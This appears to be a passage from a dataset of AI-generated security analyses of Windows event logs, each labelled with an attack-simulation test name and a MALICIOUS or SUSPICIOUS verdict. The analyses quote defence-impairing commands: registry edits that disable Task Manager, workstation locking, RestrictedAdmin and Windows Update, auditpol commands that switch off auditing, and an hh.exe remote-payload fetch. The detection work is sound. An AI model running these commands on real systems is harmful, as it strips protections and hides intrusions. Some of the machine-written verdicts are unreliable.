2. **Review admin account credentials:** Validate the authenticity of the `admin_test` account and ensure it is secure or remove it if unnecessary.

3. **Monitor network traffic:** Set up alerts for traffic from and to this host, particularly focusing on unusual or unauthorized data transfers.

4. **Conduct a deep dive into `wevtutil.exe` and `msiexec.exe` executions:** Check for any anomalies or modifications on the scripts or batch files triggering these processes.

5. **Collect and preserve evidence:** Before any further action, ensure that logs and related forensic data are securely archived for a potential security incident investigation. 

By following these steps, you can validate these activities and confirm whether they result from benign use, misuse, or are indeed indicative of malicious intent."
Create and Hide a Service with sc.exe,"Upon reviewing the provided Windows event logs, I've identified several key points that require attention:

1. **Time Manipulation:**  
   - The event logs contain entries (Event ID 4616 from Security) indicating that the system time was adjusted backward. This can be a technique used by attackers to manipulate timestamps, potentially to cover their tracks or evade detection.

2. **Creation of a Suspicious Service:**  
   - There are logs showing the creation of a Windows service (Event ID 7045 from System) with the name ""fileService,"" pointing to `C:\Windows\System32\calc.exe`. The use of a benign application like `calc.exe` in this manner is often a red flag for masquerading techniques, where attackers misuse commonly trusted applications to establish persistence.

3. **Usage of High Privilege Commands:**  
   - The logs register the execution of command-line tools like `sc.exe` to create or modify services with extensive permissions (`SeDebugPrivilege, SeTakeOwnershipPrivilege`, etc.), which indicates privilege escalation or an attempt to maintain high-level access on the system.

4. **Repeated Execution of Wevtutil and Conhost:**  
   - The repeated use of `wevtutil.exe` and `conhost.exe` in the Sysmon logs suggests that someone might be making systematic use of these tools for potentially malicious purposes, such as clearing event logs or interacting with command prompts.

Considering the actions performed, such as time manipulation and the creation of a service with potential persistence mechanisms, coupled with high privilege commands execution, these activities are indicative of potentially malicious behavior.

**Assessment: MALICIOUS**

**Threats/Risks Identified:**
- Possible unauthorized system access and manipulation.
- Creation of a persistent service using a trusted system executable (calc.exe).
- Use of high privilege commands indicative of privilege escalation.

**Guidance on How to Proceed:**
1. **Immediate Mitigation:**
   - Disable or remove the `fileService` service created, and verify no other similar unauthorized services exist.
   - Restore the original system time if it was altered inaccurately.

2. **Further Investigation:**
   - Conduct a thorough review of other systems within the network for similar signs of compromise.
   - Examine user activity and access patterns around the times these events occurred to identify potential unauthorized access.

3. **System Hardening:**
   - Implement strict time synchronization policies to prevent unauthorized time changes.
   - Ensure processes that can create or modify services are closely monitored.
   - Enhance monitoring and alerting on tools like `wevtutil.exe` and `sc.exe` to identify anomalous usage patterns.

4. **Review Security Controls:**
   - Re-evaluate and strengthen user access control policies, ensuring users have the minimum necessary privileges.
   - Apply patches and updates to ensure all systems are secure against known vulnerabilities. 

By following these actions, you can reinforce your systems' defenses and prevent future compromises."
Enabling Restricted Admin Mode via Command_Prompt,"Upon analyzing the Windows event logs provided, the following observations were made:

1. **Time Manipulation Events:**
   - Multiple instances of Event ID 4616 (""The system time was changed"") are present. The `NewTime` is set earlier than the `OldTime`. This event typically logs legitimate time synchronization activities but is worth scrutinizing to ensure it wasn't done maliciously to cover tracks.

2. **Process Execution Analysis:**
   - There are several executions of processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `reg.exe` from the `SERVER002\admin_test` user context, along with actions attempting registry edits using `cmd.exe`. 
   - The `cmd.exe` event attempts to modify the registry to disable restricted admin mode with the command:  
     `""cmd.exe"" /c reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0`. This type of operation can potentially alter security settings, indicating an attempt to lower the security posture of the system.

3. **Edge Update Events:**
   - Numerous entries regarding `Microsoft Edge Update` processes are observed. The processes occur within a short time frame. While frequent updates are expected, it’s useful to confirm if these update processes and associated installations are legitimate, given the frequency.
   
4. **Integrity Level and User Context:**
   - The processes from `cmd.exe`, `whoami.exe`, and other related executables are running with ""High"" Integrity Level. The combination of a high integrity level, registry modifications, and time backdating could indicate an attempt to run unauthorized actions while maintaining elevated permissions.

**Assessment & Resolution:**

Based on the information provided:

- **Time Change Events** could be legitimate time synchronization activities; however, in the context of questionable registry edits, these changes require further verification.
  
- **Command Execution**: The registry modification intended to disable restricted admin mode is suspicious, as it involves altering system security settings. 

- **Frequent Edge Updates**: While efficient updates might be normal, it should be cross-checked with a change management/update schedule to see if its behavior aligns with expected updates.

Given the analysis above, the logs cannot be conclusively classified as malicious just from this data set. Yet, certain activities merit closer scrutiny to rule out potential threats.

**Final Resolution: SUSPICIOUS**
- Prompt further investigation into the time changes and registry modifications.
- Review the change management and update logs for Microsoft Edge updates to ensure they align with expected operations.
- Conduct a more detailed assessment of user activities, especially around the `SERVER002\admin_test` account, to identify any anomalies."
Compiled HTML Help Remote Payload,"**Analysis of the Logs:**

1. **Time Change Events:**
   - Several Event 4616 indicate time being set backward, which can be a tactic used by malware to evade detection or logging.
   - Event 1 in the System log shows a time change initiated by the svchost.exe process. Time change events should be questioned, especially if they are not expected or scheduled.
   - The process responsible is `C:\\Windows\\System32\\svchost.exe`, which is a normal system process. However, using the service to backdate time may be an attempt to avoid detection.

2. **Privileged Access and Account Usage:**
   - Event 4672 indicates a logon with high privileges (SeDebugPrivilege, SeImpersonatePrivilege), which can be used for malicious activities if not expected.
   - The user `admin_test` has such privileges several times through Event 4624 login events, reflecting a remote login or access type that could be unusual.

3. **Unusual Process and Command Execution:**
   - In the Sysmon log, the execution of wevtutil.exe and hh.exe by `admin_test` raises a significant security concern. The command `""C:\\Windows\\System32\\cmd.exe"" /c hh.exe` is launching a connection to a remote URL, indicating potential execution of a malicious script or downloading a payload.
   - This ioction of HTML Help executable (hh.exe) accessing a remote link (RAW GitHub URL) is suspicious, as it is not expected behavior for this kind of executable.

4. **Recurrent Access to System Processes:**
   - Multiple processes like wevtutil.exe, whoami.exe, and HOSTNAME.EXE by `admin_test` reflect reconnaissance or enumeration activities within the host system.
   - The execution of `whoami.exe` suggests a check of the current permissions and rights, possibly part of privilege escalation tactics.

5. **PowerShell Usage:**
   - Restricted execution of PowerShell commands (shown in the PowerShell log) is generally normal; however, the frequent checks using system-level access needs further inspection to ensure it supports authorized operations only.

**Assessment and Recommendations:**

- **Assessment: SUSPICIOUS:** 
   - The logs reflect several suspicious activities that may indicate potential malicious actions, such as unauthorized time changes, exploitation of legitimate tools (LOLbins) like `wevtutil.exe` and `hh.exe`, and potential command and control or payload delivery attempts using PowerShell.
   - Privileged access logs for `admin_test` require a thorough review to verify the user's activities, time of access, and corresponding operations authorized by IT policy.

**Guidance:**

1. **Immediate Intervention:**
   - Investigate the `admin_test` account to confirm if the authorized user carried out these actions and check for any anomalies or anomalies.
   - Review any firewall or intrusion detection logs to see if there were unusual outbound connections, especially those related to GitHub links.

2. **Monitor and Audit:**
   - Increase logging and alerts for similar behavior, focusing on the execution of processes that access the network, changes in system time, and use of high-privileged accounts.

3. **Security Policy Review:**
   - Ensure policies regarding time changes, high-level privilege sessions, and remote executions are strictly defined and audited. Implement additional security measures such as event logging and monitoring.

In summary, the activities observed are not conclusively malicious but are highly suspicious and require deeper investigation to rule out security breaches."
Rundll32 with Control_RunDLL,"Based on the provided Sysmon logs, the analysis reveals the following points:

1. **Repeated Execution of Built-in Windows Utilities**:
    - There are several instances where Windows utilities like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are executed.
    - The suspicious entry is the use of `rundll32.exe` with `calc.dll` from a temporary directory. Running DLLs from temporary locations with `rundll32.exe` is a common tactic used by attackers to execute malicious payloads.

2. **Suspicious Use of `rundll32.exe`**:
    - The command-line involving `rundll32.exe` indicates an attempt to execute a DLL, which is not typically part of standard user behavior without context suggesting a legitimate purpose.

3. **Microsoft Edge Update Activity**:
    - There is a sequence of events related to Microsoft Edge Update, including installations and updates. This appears benign given its association with a legitimate, scheduled update process. However, if not customary on this machine, it would be worth verifying the legitimacy.

4. **Integrity Levels and Permissions**:
    - All suspicious operations are executed under a user with `High` integrity level (`SERVER002\\admin_test`), indicating a user with administrative privileges, which could be significant in a compromise scenario.

Given the findings, particularly the suspicious use of `rundll32.exe`, further investigation is needed to ensure no malicious activity is taking place:

- **Resolution: SUSPICIOUS**

**Guidance on how to proceed:**

1. **Review the `rundll32.exe` Invocation**:
   - Investigate the DLL `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll` to determine its source and legitimacy.
   - Check the file hash and compare it against known malicious databases.

2. **User Activity Review**:
   - Investigate actions carried out by `SERVER002\\admin_test`, specifically during the period leading up to the identified events.

3. **Check for Any Unauthorized Changes**:
   - Review system and application configurations or other logs for unauthorized changes, alterations, or access attempts.

4. **Validate Edge Update**:
   - Confirm the legitimacy of the Microsoft Edge Update process, especially given the timings and multiple invocations.

5. **Network Analysis**:
   - Conduct a review of network traffic logs surrounding the timestamps of these events for any suspicious or anomalous traffic.

By conducting these steps, further insights can be gained to confirm or rule out any potential malicious activity."
Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,"### Detailed Analysis

Upon reviewing the provided log entries, here are the observations and assessments:

#### Application Log
- The application log shows service stop events from the ""edgeupdate"" provider. This is typical and expected behavior for Software Update services, including Microsoft Edge. No anomalies are detected here.

#### System Log
- Multiple Kernel-General events are noted, related to system time changes. The changes are carried out by `svchost.exe`, which is a legitimate Windows process. No unexpected behavior observed.
- An event involving synchronization with `time.windows.com` also appears normal, suggesting legitimate time syncing.
- There were no unauthorized time changes or suspicious processes indicated.

#### Windows PowerShell Log
- A PowerShell session was executed to modify registry settings to set both `http` and `https` protocol defaults to `0`. While modifying registry settings can be legitimate, in this case, it is unusual, as changing protocol defaults may affect network protection mechanisms and security. This activity should be treated as suspicious unless there is a known legitimate reason for it.

#### Sysmon Log
- The Sysmon log records routine system activities, including the execution of legitimate Windows tools like `whoami.exe` and `hostname.exe`. These are common tasks performed for administrative or scripting purposes.
- Multiple executions and installations concerning Microsoft Edge Update are logged. This aligns with the typical behavior of updating Microsoft Edge and its components.
- However, multiple executions of `wevtutil.exe` are recorded by a user `SERVER002\admin_test`. If these commands were not anticipated or were outside routine administrative tasks, they should be reviewed further.

#### Security Log
- Security logs indicate time change events consistent with those found in the system logs, conducted by `svchost.exe`. No unauthorized process or particularly concerning entries are noted here.

### Assessment

1. The bulk of the logged events, including those involving Microsoft Edge Update and system time adjustments, appear routine and part of normal system operations.
2. The PowerShell log raises concern with the registry modification command, which could disable certain network security settings if this action wasn't authorized.
3. The presence of frequent `wevtutil.exe` instances might need further investigation. While not inherently malicious, unauthorized use could lead to potential compromise if used to manipulate event logs.

### Resolution

**SUSPICIOUS**

The activity involving PowerShell registry modifications, combined with repeated invocations of `wevtutil.exe`, warrants a deeper investigation. Although there is no definitive evidence of malicious actions, these could represent potential configuration tampering or an attempt to obfuscate log data.

### Guidance

1. **Verify PowerShell Activity**: Determine if the registry modifications were an approved change or if they were executed by an unauthorized user. Check for related changes or impacts on network security postures.
2. **Log Further Investigation**: Review the specific commands run by `wevtutil.exe` to confirm if they align with authorized administrative tasks.
3. **Further Monitoring**: Implement proactive monitoring for changes to similar registry keys and unusual PowerShell activity. This can enhance detection capabilities and prevent configuration tampering.
4. **Access Analysis**: Confirm that the `admin_test` account or any other relevant accounts have not been compromised.

By analyzing these points, you can ensure system integrity and potentially identify malicious activity early."
Disable Windows Lock Workstation Feature,"Upon reviewing the provided Sysmon logs, the following observations can be made:

1. **Frequent use of `wevtutil.exe` and `conhost.exe` under a test admin account**: There are several logs indicating the repeated execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to manage event logs, however, its frequent invocation within such a short time frame could be indicative of malicious intent, such as an attempt to clear or tamper with event logs.

2. **Registry Modification**: The command `cmd.exe` executing a registry change is concerning. The command attempts to add a registry key to disable the locking of workstations (`DisableLockWorkstation`). This is typically an action that might be performed by malware to ensure that a system remains unlocked for further exploitation.

   Command: `cmd.exe /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f`

3. **Execution of System Utilities**: Processes such as `whoami.exe`, `hostname.exe`, and `cmd.exe` under the `admin_test` account were observed. The execution of `whoami.exe` is often used to check the privileges of the current user, which could suggest a recon activity commonly associated with adversarial behavior.

4. **Microsoft Edge Updates**: There are numerous logs detailing Microsoft Edge's update processes, which from initial glance appear to be legitimate given the program paths and common file names associated with updates. The process executions appear to involve the Edge update mechanism and are executed under `NT AUTHORITY\\SYSTEM`, pointing to scheduled or automated tasks.

### Conclusion:

The activities within these logs mostly relate to the execution of legitimate Windows internal utilities, but certain actions suggest non-standard or suspicious behavior:

- **Registry modifications** to disable workstation locking raise suspicion, as they are modifications typically exploited by malicious actors to reduce a system's security.
- Use of `wevtutil.exe` with such frequency and rapid succession, especially under a test admin account, should be verified to ensure this is not an attempt to clear logs.

Based on these observations, the logs can be classified as **SUSPICIOUS**. The actions observed warrant further investigation to confirm whether they were conducted with legitimate intent or part of malicious activities.

### Recommendations for Further Investigation:

1. Verify whether the frequent usage of `wevtutil.exe` and other system utilities were part of regular maintenance activities performed by an administrative script, or an unauthorized script was executed.
   
2. Investigate the intention behind modifying registry keys related to 'DisableLockWorkstation'. This should include interviewing the involved users about their activities on or around the specified times.

3. Consider the possibility of an insider threat given that the actions were performed using an administrative account (`admin_test`). Review access logs and user activity for any signs of unusual access patterns.

4. Ensure that the host is scanned with updated antivirus and anti-malware tools to detect any known signatures or anomalies.

5. Obtain full user activity logs and network logs from around the time of these events for comprehensive forensic analysis."
Regasm Uninstall Method Call Test,"Based on the provided event logs, here is a detailed analysis of potential suspicious behaviors:

### Analysis:

1. **Microsoft Edge Update Activity**:
   - There are numerous entries related to `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup.exe` processes running under `NT AUTHORITY\SYSTEM` user context. These logs show typical update and registration activities for Microsoft Edge, which typically occurs under system-level privileges. There doesn't appear to be any unusual or unexpected command-line arguments that stand out in these logs to signify malicious actions.
   
2. **PowerShell Execution**:
   - There is a relevant entry showing `powershell.exe` executed under `SERVER002\admin_test` user. The execution of PowerShell can often be legitimate, especially by administrators; however, the absence of additional details (e.g., script or command executed) limits our ability to conclusively rule out malicious activity. The context and frequency of PowerShell execution could be further monitored in a real-world scenario.
   
3. **Process Activity using Conhost.exe and Wevtutil.exe**:
   - Several entries show executions of `wevtutil.exe` and `conhost.exe` under the `SERVER002\admin_test` user. The `wevtutil.exe` is a legitimate Windows utility used for event log manipulation and could be used in administrative tasks or potentially for log clearance in malicious activities. The presence of these processes should be noted but not inherently indicative of malicious intent without further context.
   
4. **Potential Compiler or Code Execution Activity**:
   - An entry for `cmd.exe` executing with a command line that involves `csc.exe` (C# compiler) and `regasm.exe` (a tool to register .NET assemblies) indicates that there was a possible on-the-fly assembly compilation and registration occurring. This behavior can be associated with both legitimate developer tasks or, alternatively, methods used in malware delivery and persistence. The hash values provided would be beneficial for further assessment if the assembly content can be analyzed or traced against known signatures.

### Assessment:

- **Overall Suspicion**:
  The activities recorded in the logs could be related to regular update processes and maintenance activities on a server. The use of `PowerShell`, `cmd`, `csc.exe`, and `regasm.exe` could potentially warrant deeper investigation due to their capabilities for being used in code execution and system alterations. However, without specific evidence from these logs of malicious indicators such as odd network connections, persistence hooks, or clear exploitation behavior, it's difficult to assert definitive malicious activities.

### Recommendation:
Given the logs analyzed do not show absolute indicators of compromise but can be related to usual administrative tasks or benign update processes, I would conclude these findings as:

- **Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed:
1. **Further Investigation**:
   - Verify the necessity and source of the PowerShell command executed.
   - Confirm if the `cmd.exe` involving a compilation was a legitimate development or administrative action.
   - Check if any of the hash values match known malicious signatures in threat intelligence feeds.
   
2. **Monitoring**:
   - Enable logging and monitoring for any anomalous use of `PowerShell`, registry changes, and unusual scheduled tasks.
   - Ensure proper baselines are established to distinguish between normal system and application usage patterns against potentially malicious deviations.

3. **Contextual Review**:
   - Conduct interviews or reviews with administrators of `Server002` to understand any scheduled tasks or manual updates that may clarify these actions.
   - Correlate with network logs, if available, to identify any anomalies in network communications during/after these events. 

If further evidence or context reveals more intentional misuse, escalation to a comprehensive threat analysis might be recommended."
Disable Windows Task Manager application,"In analyzing the provided Windows event logs, let's break down the observations and identify any suspicious or anomalous behavior.

### Application Log:
- **Microsoft-Windows-Security-SPP:** Typical logging of Software Protection Platform Service. This is a benign entry.
- **edgeupdate:** Represents routine operations regarding the Edge update service being stopped. There was no specific indication of malicious activity in these logs related to Edge update service states.

### Security Log:
- **Event ID 4616:** This event shows a time change by svchost.exe for LOCAL SERVICE. Time change events can be legitimate but can also indicate tampering when performed with malicious intent. However, svchost.exe is a common process for legitimate operations.

### Sysmon Log:
- **Cmd.exe, whoami.exe, reg.exe, and reg modification:** A key indicator of suspicious behavior is the use of a command that modifies registry to disable Task Manager (`DisableTaskmgr`). This action was executed by `cmd.exe` using the `reg add` command, indicating a deliberate attempt to hinder user ability to monitor processes. Disabling the task manager is typical in malicious scenarios to obstruct users from terminating processes or identifying unauthorized activity.

- **wevtutil.exe and conhost.exe:** These processes are usually legitimate, especially when conducted by an admin user. However, frequent use around the same period warrants attention but might be related to system maintenance unless correlated with additional suspicious activities.

### System Log:
- **Time Change Events:** Observed with svchost.exe, which coincides with the Security log. Adjustments to system time aren't inherently malicious but could be used to interfere with event log timestamps in certain scenarios. 

### Assessment:
The standout suspicious activity is the command execution involving registry modification to disable Task Manager. This modification is a significant indicator of potential malicious intent, as it is a common tactic to impair a user's ability to detect and close unauthorized processes. The environment seems to manifest an initial phase of compromise, where control over the administrative tools is being established.

### Recommendations:
1. **Immediate Investigation:** Conduct a thorough investigation of the `SERVER002` for any unauthorized access or anomalies.
2. **Analyze Parent-Child Process Relationships Further:** Examine how and why `cmd.exe` executed the modification command. Look for any unknown or suspicious parent processes.
3. **Review System Logs:** Check other system and event logs for additional signs of unauthorized or unexpected activities leading up to these modifications.
4. **System Integrity Check:** Run in-depth scans and use endpoint detection tools to ensure the integrity and security of the system.
5. **Review Users with Elevated Privileges:** Identify and ensure the legitimacy of actions conducted with elevated (admin) privileges, like those by `admin_test`.

### Resolution:
Activity within the logs is classified as **MALICIOUS** due to the registry modification aimed at disabling Task Manager—a known behavior in malicious intrusions seeking to evade detection. Further investigation and incident response are crucial to confirm the full scope of any compromise and mitigate any potential threats."
Do Not Connect To Win Update,"Upon thorough reviewing the provided Windows event logs, let's analyze potential indicators of malicious activity or suspicious behavior across the different logs.

### Analysis:

1. **System Log:**
   - There are several entries related to time change events (Event ID 24 and 1) handled by svchost.exe. These events are generally indicative of normal system operations managing time synchronization adjustments via the Windows Time Service.
   - There is no direct indication of manipulation outside regular services presented here.

2. **Sysmon Log:**
   - Several entries indicate execution of typical system utilities (whoami.exe, conhost.exe, wevtutil.exe, hostname.exe, reg.exe) by the user ""SERVER002\\admin_test"". 
   - The use of `whoami.exe` and `hostname.exe` is commonly used for verifying user context and system identity checks, which are usually benign but may be used in scripting administration or exploration activities.
   - Repeated execution of `wevtutil.exe` could suggest log manipulation or querying, but no direct evidence suggests altered content or purpose outside normal bounds.
   - Use of `reg.exe` to modify Windows Update policies: `reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate"" /v ""DoNotConnectToWindowsUpdateInternetLocations""` — This type of registry modification can be an indicator of an attempt to alter system's update behavior, possibly to prevent patching or modification.

3. **Security Log:**
   - Time adjustment entries correlate with system log changes and do not signify unauthorized changes.
   - Processes running under `svchost.exe` through local service account appear normal given no anomaly in service execution.

4. **Application Log:**
   - Entries indicating activity for the Software Protection Platform Service (Event ID 16384) as part of regular checks for software license verification. No signs of compromise.

5. **PowerShell Log:**
   - No log entries provided for PowerShell, so there's nothing to assess here.

### Threat Assessment:
- The presence of `cmd.exe` used to execute a command that modifies a critical registry entry related to Windows Update is noteworthy. Although it may be legitimate for a system administrator to apply such a change, it can also indicate a potential security posture degradation by preventing system updates which is a common tactic to inhibit security patches.

### Recommendation for Resolution:
Given the findings, I advise the following:

1. **Resolution: SUSPICIOUS**: The combination of allowing modification to registry which changes update settings implies the need for further investigation. While not immediately malicious, this activity is atypical without supporting justification.
   
2. **Proceeding Steps:**
   - Verify with IT administration if recent modifications to update policy were planned.
   - Conduct further assessments on the admin_test account for unusual behavior or logs outside these samples.
   - Monitor if processes like `whoami.exe` or repeated `wevtutil.exe` calls continue as they could provide indicators on user's activity intention.

Such vigilance should ensure the integrity of system operations is maintained while corroborating legitimate administrative activities."
File Extension Masquerading,"Upon analysis of the provided log files, there are several observations that indicate potentially suspicious and malicious activity:

### 1. **PowerShell Activity**:
- The Windows PowerShell log entries indicate the execution of PowerShell scripts with names suggesting potential file masquerading (e.g., `data.003_masquerading.doc.ps1`, `data.003_masquerading.pdf.ps1`, `data.003_masquerading.rtf.ps1`).
- PowerShell was executed from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp`), which is commonly used in malicious scenarios.

### 2. **Sysmon Logs**:
- The Sysmon logs show the execution of potentially legitimate Windows executables renamed with misleading extensions (`.docx.exe`, `.pdf.exe`, `.ps1.exe`), often associated with attempts to fool users or evade detection by security controls.
- Several scripting executables like `wscript.exe` executed scripts with suspicious naming (`data.003_masquerading.xls.vbs`, etc.), indicating potential malware.
- The command-line execution, including copying and renaming of system files (e.g., `calc.exe`), follows patterns often used in malware dropper scenarios.

### 3. **Security Logs**:
- There's continuous activity involving failed operations on `MicrosoftAccount` and `WindowsLive` identifiers, reflected by repeated `ReturnCode`= `3221226021` (Access Denied). Although these by themselves are not conclusive on their own, in combination with other logs can show signs of malicious attempts.

### 4. **Suspicious Command Line Execution**:
- The command `cmd.exe` was utilized to execute a series of commands involving the renaming and execution of the renamed files, which is indicative of tactics used to bypass security controls.

### Conclusion:
Combining the above patterns, the activity observed highly suggests potential malware execution leveraging file masquerading and temporary script execution. The series of logs indicate attempts to escalate or camouflage actions within seemingly legitimate processes and execution flow, typical in malicious activities.

### Resolution:
**MALICIOUS** - The logs consist of activities that align strongly with identified malicious patterns like file masquerading, script execution from temporary directories, and multiple failed security access attempts. Immediate remediation steps, including a thorough forensic investigation, isolating the affected host, and conducting further threat hunting in the network, are advised."
Register Portable Virtualbox,"Upon analyzing the provided event logs, here is a summary of potentially suspicious activities and overall findings:

1. **PowerShell Activity:** 
   - The Sysmon and Windows PowerShell logs show the execution of PowerShell on the system with the admin_test account. Particularly interesting is the command that invokes PowerShell to create a directory and uses `Invoke-WebRequest` to download a file from an external URL (`https://github.com/file/file-file/raw/master/files/data.006/bin/common.cab`). This operation resembles activity often associated with malicious scripts or attempts to download potentially harmful files from an external source.

2. **Parent-Child Process Relationships:** 
   - There are several instances of process creation that seem unusual. For instance, certain system utilities (`wevtutil.exe`, `whoami.exe`) are executed by the `admin_test` user, originating from a process called `wsmprovhost.exe -Embedding`. This unusual parent-child relationship could suggest scripted or remote management operations.

3. **Service Creation and Execution:**
   - We observe the execution of commands typically used to register COM servers and start services using the `cmd.exe`, `sc.exe` utilities which include commands like `regsvr32`, `rundll32`, and service control (`sc create`, `sc start`). Although these could be part of legitimate software installation or configuration tasks (like VirtualBox), this activity pattern is frequently leveraged by attackers to persist malicious services.

4. **Network and Privilege-Related Activities:** 
   - Event ID 403 in the PowerShell log corresponds to downloading files using PowerShell, often seen in attack scenarios.
   - Security Event ID 4624 along with Event ID 4672 shows privileged access successful logons that match the timing of these unusual processes. This could present a risk of privilege misuse or escalation.

5. **Process Executions:** 
   - The presence of `RUXIMICS.exe` processes running under `NT AUTHORITY\SYSTEM` in combination with other processes like `dllhost.exe`, `svchost.exe`, without unusual arguments or parent processes, does not immediately indicate maliciousness.

The combination of downloading external files via PowerShell, creating new services, and executing commands with high privileges, particularly under circumstances that may allow code execution, points to activity deserving further scrutiny and cannot be immediately regarded as benign. Without more contexts such as user intent and additional logs, this analysis leans towards caution.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Conduct further investigation into the network activity corresponding to the PowerShell download to assess if other systems might be affected.
- Review and potentially block or monitor the aforementioned URL at the perimeter firewall.
- Conduct a deeper investigation into the specific use and configuration of VirtualBox on this host to verify it aligns with legitimate user activities.
- Ensure that appropriate security patches and endpoint protections (e.g., AV/EDR solutions) are correctly installed and enabled.
- Monitor for additional similar activity across the network for signs of broader compromise.
"
Impair Windows Audit Log Policy,"After analyzing the provided Windows event logs, I've identified a few key areas that show potentially suspicious activities which warrant further investigation:

1. **Sysmon Log - Suspicious Command Execution**:
   - Multiple instances of the execution of `auditpol.exe` via `cmd.exe` with commands intended to disable audit policy for certain categories like ""Account Logon"", ""Logon/Logoff"", and ""Detailed Tracking"" (ProcessGuid `dbf410b3-710b-671f-cf00-000000003900`). Disabling audit policies is typically viewed as a precursor to malicious activities where the attacker aims to cover their tracks.

2. **Security Log - Audit Policy Changes**:
   - There are several instances of Event ID 4719, which indicate changes in the audit policy performed by an account (User ""SERVER002\\admin_test""). These changes correspond to the disabling of audit policies mentioned above, confirming that some modifications were made to the audit settings.

3. **System and Kernel Logs - Time Change**:
   - Notably, there are changes in system time (Event IDs 1 and 4616) involving `svchost.exe`, a common target for attackers to alter timestamps and potentially confuse log timelines. Although time sync adjustments can happen normally, in conjunction with audit policy changes, this demands scrutiny.

4. **Excessive Process Execution by `admin_test`**:
   - The user `admin_test` is consistently shown running sensitive utilities like `wevtutil.exe`, `whoami.exe`, and `cmd.exe` along with the previously mentioned command-line arguments. The volume and nature of these processes suggest potentially unauthorized enumeration or manipulation actions.

5. **High Integrity Levels**:
   - All suspicious processes are executed with a high integrity level, which is often indicative of administrative privileges. This is consistent with a scenario where an attacker might be trying to escalate privileges or hide activities.

**Resolution**: 

Given the nature of the activities (disabling logging/audit policies and potentially tampering with the system clock), combined with the administrative execution privileges observed, there are strong indicators of malicious intent. The actions are consistent with those commonly taken during initial compromise or as part of a persistence mechanism.

**Final Assessment**: **MALICIOUS**

**Guidance on how to proceed**:
- Immediately contain the affected system by isolating it from the network.
- Conduct a thorough forensic analysis to ensure root cause identification and scope of the compromise.
- Review access logs and correlate with network activity to ascertain potential data exfiltration.
- Reset credentials for all accounts involved and enforce strong password policies.
- Restore audit policies to their recommended settings and implement enhanced logging measures.
- Perform a comprehensive security audit of the remaining network to identify other compromised systems or vulnerabilities."
Delete an entire folder - Windows cmd,"In reviewing the provided Sysmon logs, there are a few observations to consider:

### Observations:
1. **User Activity**:
   - The `SERVER002\admin_test` user executed several processes, including `whoami.exe`, `cmd.exe`, `hostname.exe`, and `wevtutil.exe`, using the high integrity level, indicating administrative privileges. These commands are legitimate administrative tasks, but their sequence and frequency should be noted.

2. **Command-Line Execution**:
   - The `cmd.exe` was used multiple times with various command-line arguments:
     - Checking for the existence of a file or directory (`IF EXIST ""%temp%\deleteme_data.004"" ( EXIT 0 ) ELSE ( EXIT 1 )`).
     - Creating a directory (`mkdir %temp%\deleteme_data.004`).
     - Removing a directory (`rmdir /s /q %temp%\deleteme_data.004`).
   - These operations appear to involve temporary file or directory management which may be part of a script or maintenance task. However, frequent and automated file operations in `%temp%` can sometimes be indicative of malware behavior, particularly if used to create or clean up artifacts.

3. **Use of `wevtutil.exe`**:
   - The repeated invocation of `wevtutil.exe`, a tool used to manage event logs, might be suspicious if the intention is clearing logs to hide traces of malicious activity. It can be completely benign if used for legitimate log management.

4. **Parent Processes**:
   - The parent process for many activities was `wsmprovhost.exe -Embedding`, which relates to Windows Remote Management (WinRM). This could indicate that these commands were executed remotely. Legitimate administrative activities via remote sessions often use this service.

5. **Processes Run by System Accounts**:
   - Multiple services like `svchost.exe`, `sppsvc.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` were run by system accounts but seem consistent with routine system operations (service management, updates).

6. **Integrity Level**:
   - All actions were performed with a high integrity level, suggesting the user has administrative privileges or is intended by design to require such.

### Analysis:
- The execution pattern of utilities (`whoami`, `hostname`, `cmd`, `wevtutil`) corresponds with routine administrative queries or system automation scripts. While the log entries could suggest a tool aiming to revert temporary changes without leaving traces (`rmdir /s /q`), the actions themselves are not inherently malicious.

- The use of `wevtutil.exe` for potential log clearing or management should be monitored closely. Large volume execution of log management commands without clear documentation or justification from system administrators could warrant further investigation.

### Conclusion:
- **Resolution**: **SUSPICIOUS**

Though there are no definitive signs of malicious activity, the potential for misuse or unexpected behavior (especially with `wevtutil.exe` and temporary directory manipulations via `cmd.exe`) means further inspection into the intentions behind these actions is prudent. It would be advisable to:
- Review any scheduled tasks or automation scripts associated with these operations.
- Verify against expected behavior from administrators.
- Consider implementing further monitoring, such as alerting on excessive usage of event log management tools or unexpected processes triggered by remote sessions."
Lolbin Jsc.exe compile javascript to dll,"Upon review of the provided Windows event logs, several observations were made regarding the activity on Server002. Here's a detailed analysis:

### Log Analysis:

**Security Log:**
- **Event ID 4624 and 4672**: These events depict successful logons using the SYSTEM account, commonly used by legitimate services for logon operations. The specified privileges obtained (e.g., `SeDebugPrivilege`) are standard for SYSTEM accounts but are still high-level. The logon types and process names indicate typical system operations.
- **Event ID 5379**: Numerous attempts to access Microsoft Account credentials show return codes indicating failure (3221226021). The repeated failures are somewhat uncommon but could result from automated system retries.
- **Event ID 4798 and 4799**: Enumeration of local group memberships and tasks carried out by `taskhostw.exe` and other system-level processes suggest normal system management and update tasks.

**Sysmon Logs:**
- **Event ID 5 and 1**: A series of legitimate Windows executables (`whoami`, `cmd`, `wevtutil`, `conhost`, `rundll32`, `sc.exe`, etc.) are executed through typical system usage and with SYSTEM account. 
- **Unusual CommandLine**: The command-line operations involving copying a script (`LibHello.js`) and using `jsc.exe` to compile it might raise suspicion if unexpected in this environment, although this alone without additional context or known threat indicators could represent a legitimate developer or maintenance operation.
- **Microsoft Edge Update**: The Edge installer and update commands run with the expected paths and arguments, indicating a regular update process.

### Assessment:

